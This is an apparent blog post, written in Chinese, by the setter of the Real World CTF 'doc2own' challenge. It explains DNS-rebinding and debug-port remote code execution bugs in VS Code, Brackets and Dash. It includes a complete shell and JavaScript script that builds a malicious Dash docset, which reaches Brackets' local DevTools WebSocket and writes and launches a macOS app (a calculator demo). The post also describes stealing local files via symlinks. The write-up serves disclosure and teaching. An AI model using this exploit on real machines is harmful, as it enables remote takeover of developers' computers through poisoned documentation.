<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Real World CTF doc2own 命题报告</title>
</head>
<body>
<p><a href="https://zhuanlan.zhihu.com/p/41544965">原文</a></p>
<div class="title-image"><img src="https://pic4.zhimg.com/v2-45dff9e7b0164cc42ef97d36d70acc61_r.jpg" alt=""></div><p>本文作者：咸鱼</p><p>上个月的 realdworldctf 设计了一个完全真实的客户端软件 pwn 题目。</p><p>在接到出题邀请的时候也差点要“另请高明”了。当时正好在准备 <a href="https://zhuanlan.zhihu.com/p/21776300">LoCCS 的暑期学校</a>的课件，因为拖延搞得讲课前夜通宵没睡狂写 ppt，紧接着又安排出差，趁着飞机延误之类的边角时间写评测环境和测试 exploit 之类，最后还是在比赛已经开始的情况下才在第一个晚上把稳定性堪忧的环境部署上线。</p><p>仓促的出题过程也是埋下了伏笔。竟然在比赛过程中，先后有几支国际队伍交上了真正的 0day 利用。而赛后我简单反编译了程序，还发现了更多的远程代码执行问题。</p><p><b>由于补丁今天刚刚发布，在这里我不会公开相关漏洞的细节。</b></p><hr><p>在年初我偶然发现了一个 Visual Studio Code 的远程代码执行漏洞，而报告后发现被撞洞了。这个问题是 Electron 使用了 Chromium 的远程前端调试协议，是基于 http 和 WebSocket 的。</p><p>攻击者在知道调试端口的情况下，可以使用 dns 重绑定的技巧获得一个随机的 uuid，构造一个 WebSocket 协议的 url，向 Electron 的前端注入任意代码，实现 node.js 任意代码执行。</p><p>VSCode 在部分版本中意外开启了 Extension 进程的调试端口，只要浏览一个网页并停留数十秒（dns rebinding 需要一段时间让旧 dns 记录失效），计算机便可被远程控制：</p><a href="https://link.zhihu.com/?target=https%3A//medium.com/0xcc/visual-studio-code-silently-fixed-a-remote-code-execution-vulnerability-8189e85b486" data-draft-node="block" data-draft-type="link-card">Visual Studio Code silently fixed a remote code execution vulnerability</a><p>受此启发我在 Adobe Brackets 上发现了完全一致的漏洞：</p><a href="https://link.zhihu.com/?target=https%3A//github.com/adobe/brackets/issues/14149" data-draft-node="block" data-draft-type="link-card">CEF remote debugging is vulnerable to dns rebinding attack #14149</a><p>与 VSCode 不同的是，Adobe Brackets 没有使用 Electron，而是自行封装的 libCEF 框架，与 node.js 的集成方式也不同。Electron 可以在 window 的上下文中访问 node.js API，而 Brackets 的编辑器前端则没有提供这个功能，尽管 Brackets 当中使用到了 node.js 运行时。</p><p>不过 Brackets 在上下文中暴露了如下的两个对象：brackets 和 appshell</p><img src="https://pic3.zhimg.com/v2-f1387cef8bb0e11e95bd04389228fc2f_r.jpg" data-caption="" data-size="normal" data-rawwidth="1612" data-rawheight="834" data-watermark="watermark" data-original-src="v2-f1387cef8bb0e11e95bd04389228fc2f" data-watermark-src="v2-2cfaacf85c79d72c0eb08060a3756933" data-private-watermark-src=""><p>这两个对象封装了文件系统和 shell 相关的功能。虽然我们不能 require('child_process')，但是通过 appshell.fs 可以实现任意文件读写。到文件读写这一步其实已经可以拿 flag 了，当然一开始我们没有给出 flag 的路径，还是反弹一个 shell 比较靠谱。覆盖可执行文件加上额外的触发条件即可实现远程代码执行。</p><p>在 Brackets 的扩展接口中，我找到了如下两个与系统 shell 相关的方法：</p><ul><li>brackets.app.openURLInDefaultBrowser</li><li>brackets.app.showOSFolder</li></ul><p>前者支持打开 file:/// 域名，在 Windows 下相当于 ShellExecute，打开一个 .cmd 或者 .exe 即可执行代码；而 showOSFolder 在 macOS 下的表现是，如果文件夹是一个有效的 .app bundle，那么等同于双击 .app，也就是运行。如果你不太明白，那么请尝试在终端中执行</p><code lang="text">find /Applications/Calculator.app
open /Applications/Calculator.app</code><p>因此我们先判断平台差异，通过 appshell.fs 创建可执行文件，然后调用对应的方法即可运行：</p><code lang="text">function calc() {  // use brackets.fs to write your own executable  // makedir, writeFile, chmod are your friends  if (brackets.app.getUserDocumentsDirectory().indexOf('/') === 0) {    brackets.app.showOSFolder('/Applications/Calculator.app');  } else {    brackets.app.openURLInDefaultBrowser('file:///C:/windows/system32/calc.exe');  }}</code><p>到这里即可实现与 VSCode 之前的 bug 完全一致的效果，通过 dns 重绑定攻击本地端口实现远程代码执行。在我之前的漏洞报告后，libCEF 参考 node.js 和 Electron 的做法修复了 dns 重绑定的问题。但是最新版 Brackets 的这个端口仍然可以从 localhost 访问。</p><hr><p>为什么盯上了 Dash 呢？</p><p>Dash 可以说是以 macOS 为主力开发环境的程序员当中很受欢迎的一款工具了，主要功能就是离线看文档。文档是一个后缀为 docset 的 bundle 文件夹，存放 html 资源和索引数据库等。</p><p>它具有两个攻击面，一个是展示文档时用的是 WebView，另一个是在打开文档的时候会启用一个内置的 GCDWebServer 来启动一个 http 服务，可通过其他计算机访问。</p><p>macOS 上的 <a href="https://link.zhihu.com/?target=https%3A//developer.apple.com/documentation/webkit/webview%3Flanguage%3Dobjc">WebView</a> 和 iOS 的 UIWebView 在很多方面是一样的：</p><ul><li>没有进程隔离和 sandbox</li><li>在 file:/// 域下的文件默认具有 AllowUniversalAccessFromFileURLs 和 AllowFileAccessFromFileURLs 的 UXSS 能力</li></ul><p>在之前版本的 Dash 就可以通过一个恶意的 docset，以 XMLHttpRequest 的方式读取并上传本地文件（例如 ssh 公私钥）的内容。在 3.x 的某一个版本（具体不详）中增加了限制，如果访问的文件在 docset 目录之外会失败。但这个版本可以使用在压缩包中添加符号链接的方式绕过（由于 docset 是文件夹，通常的分发方式是使用 tar.gz 包）。此外符号链接的问题同样影响 Dash 内置的 http 服务。</p><p>经过报告后修复了本地文件泄露的问题，这也为出题提供了一个绝佳的条件——这是个允许跨域请求，却又不能简单 AJAX 读本地文件的环境，选手必须实现实质性的远程代码执行。最后这个 WebView 和系统内置 Safari 的 WebKit 是一致的，避免选手使用已公开的浏览器漏洞利用代码来获得权限。至于打 ctf 用 Safari 0day？疯了吗。</p><hr><blockquote><b>doc2own</b> ( Points: 425, Solved by 4 Teams )<br>I have to fix these issues during the flight. Since that airline does not provide Internet, I have to download some documents for offline use.<br><a href="https://link.zhihu.com/?target=http%3A//34.236.229.208%3A8080">http://34.236.229.208:8080</a><br>Hint : It’s a pwnable game. You really need to achieve RCE to get the flag.</blockquote><p>题目设定的剧情就是一个像我一样的信息技术底层劳动力，在出差的路上需要修 bug，又没网，只能下一个离线文档备用。而这时候下到了不干净的文档，于是电脑中招了。</p><p>217 战队按照预期的解法做了出来。</p><a href="https://link.zhihu.com/?target=https%3A//blog.l4ys.tw/2018/07/realworld-ctf-2018-doc2own/" data-draft-node="block" data-draft-type="link-card">https://blog.l4ys.tw/2018/07/realworld-ctf-2018-doc2own/</a><p>在这里附上我自己调试通过的一个解法，生成一个 docset，在 Brackets 运行的情况下打开会弹出一个计算器</p><code lang="text">contents=exploit.docset/Contentsdocs=$contents/Resources/Documents

rm -r $contentsmkdir -p $docs
cat &gt; $docs/index.html &lt;&lt;- "EOF"&lt;script&gt;
async function main() {  const list = await fetch('http://localhost:9234/json').then(r =&gt; r.json());  const item =  list.find(item =&gt; item.url.indexOf('file:///') === 0);  if (!item) return console.error('invalid response');  const url = `ws://127.0.0.1:9234/devtools/page/${item.id}`;  console.log('url:' + url);  exploit(url);}function exploit(url) {  function calc() {    const fs = window.appshell.fs;    const mkdir = path =&gt; new Promise((resolve, reject) =&gt;
      fs.makedir(path, 0755, err =&gt; err =&gt; err === 0 ? resolve(true) : reject(err)));    const writeFile = (path, content) =&gt; new Promise((resolve, reject) =&gt;
      fs.writeFile(path, content, 'utf8', false, err =&gt; err === 0 ? resolve(true) : reject(err)));    const chmod = (path, mode) =&gt; new Promise((resolve, reject) =&gt;
      fs.chmod(path, mode, err =&gt; err === 0 ? resolve(true) : reject(err)));    const INFO_PLIST = `&lt;?xml version="1.0" encoding="UTF-8"?&gt;
      &lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
      &lt;plist version="1.0"&gt;
      &lt;dict&gt;
        &lt;key&gt;CFBundleExecutable&lt;/key&gt;
        &lt;string&gt;hello&lt;/string&gt;
        &lt;key&gt;CFBundleIconFile&lt;/key&gt;
        &lt;string&gt;AppIcon&lt;/string&gt;
      &lt;/dict&gt;
      &lt;/plist&gt;`;    const EXEC = `#!/bin/sh      open -a Calculator`;    const app = '/tmp/test.app/';    const base = app + 'Contents/'    return mkdir(base + 'MacOS')      .then(writeFile(base + 'Info.plist', INFO_PLIST))      .then(writeFile(base + 'MacOS/hello', EXEC))      .then(chmod(base + 'MacOS/hello', 0777))      .then(new Promise((resolve, reject) =&gt; {        brackets.app.showOSFolder(app)      }));  }  const ws = new WebSocket(url);  ws.onopen = async () =&gt; {    let counter = 13371337;    const send = (method, params) =&gt; new Promise((resolve, reject) =&gt; {      const id = counter++;      const recv = ({ data }) =&gt; {        const parsed = JSON.parse(data);        if (parsed.id === id) {          resolve(parsed.result);          ws.removeEventListener('message', recv);        } else {          console.log('message: ', data);        }      };      ws.addEventListener('message', recv);      ws.send(JSON.stringify({ id, method, params }));    });    const response = await send('Runtime.evaluate', { expression: `(${calc})()` });    console.log(response.result);    ws.close();  }  ws.onerror = () =&gt; console.log('failed to connect');}main();&lt;/script&gt;
EOF

cat &gt; $contents/Info.plist &lt;&lt;- "EOF"&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
  &lt;key&gt;CFBundleIdentifier&lt;/key&gt;
  &lt;string&gt;exploit&lt;/string&gt;
  &lt;key&gt;CFBundleName&lt;/key&gt;
  &lt;string&gt;Exploit&lt;/string&gt;
  &lt;key&gt;DocSetPlatformFamily&lt;/key&gt;
  &lt;string&gt;exploit&lt;/string&gt;
  &lt;key&gt;dashIndexFilePath&lt;/key&gt;
  &lt;string&gt;index.html&lt;/string&gt;
  &lt;key&gt;isDashDocset&lt;/key&gt;
  &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
EOF

sqlite3 -batch $contents/Resources/docSet.dsidx &lt;&lt; "EOF"CREATE TABLE searchIndex(id INTEGER PRIMARY KEY, name TEXT, type TEXT, path TEXT);CREATE UNIQUE INDEX anchor ON searchIndex (name, type, path);INSERT OR IGNORE INTO searchIndex(name, type, path) VALUES ('Exploit', 'Class', 'index.html');EOF

open exploit.docset

tar czf exp.tar.gz exploit.docset</code><img src="https://pic4.zhimg.com/v2-9aed9f3c57895c564fc6c61b0437830f_r.jpg" data-caption="" data-size="normal" data-rawwidth="725" data-rawheight="364" data-watermark="watermark" data-original-src="v2-9aed9f3c57895c564fc6c61b0437830f" data-watermark-src="v2-ce59018ec0a4bbcde7976e3433c41c84" data-private-watermark-src=""><hr><p>但是出乎我意料的是，另外三支强队 PPP, CyKOR 和 ESPR 在短短的比赛期间内直接交上了两个不同的 0day 解法。赛后我向厂商整理漏洞报告，又快速浏览了一遍反汇编，又发现了另外的一些疑似远程代码执行问题（我没有做 poc，经过开发者自己确认存在）。</p><p><b>Dash 作者接到报告之后非常迅速地推出了修复补丁，检查了线上的 Dash 文档仓库确保之前没有实质性的攻击，在更新日志中明确写明了安全漏洞的存在并对以上战队表示了致谢。应急响应做得非常不错。</b></p><img src="https://pic2.zhimg.com/v2-c1224d9312c077421d4def640a5263d5_r.jpg" data-caption="" data-size="normal" data-rawwidth="1244" data-rawheight="1188" data-watermark="watermark" data-original-src="v2-c1224d9312c077421d4def640a5263d5" data-watermark-src="v2-8696ee455e323a6046252f1330f416cb" data-private-watermark-src=""><p>Dash 用户请尽快升级到 4.4.0 来修复这些问题。</p>
<script async defer="defer" src="https://www.googletagmanager.com/gtag/js?id=UA-7909075-5"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){ dataLayer.push(arguments); }
gtag('js', new Date());
gtag('config', 'UA-7909075-5');
</script>
<script>
var _hmt = _hmt || [];
</script>
<script async defer="defer" src="https://hm.baidu.com/hm.js?e3d40295e416616ddc21287da9646d31"></script>
</body>
</html>
